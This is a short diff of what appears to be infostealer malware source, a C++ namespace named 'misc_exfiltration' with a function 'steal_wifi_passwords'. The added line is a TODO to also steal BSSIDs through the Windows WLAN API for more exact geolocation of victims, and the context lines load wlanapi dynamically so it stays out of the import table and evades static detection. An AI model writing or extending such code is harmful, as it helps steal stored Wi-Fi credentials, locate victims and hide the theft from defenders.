@@ -49,6 +49,8 @@ namespace misc_exfiltration {
     }
 
     void steal_wifi_passwords() {
+        //TODO: steal BSSID via WlanGetNetworkBssList  (wlanapi) for more exact geo locating.
+        
         //dynamic load keeps wlanapi out of the import table. hope this helps
         typedef DWORD (WINAPI* pfn_WlanOpenHandle)(DWORD, PVOID, PDWORD, PHANDLE);
         typedef DWORD (WINAPI* pfn_WlanCloseHandle)(HANDLE, PVOID);
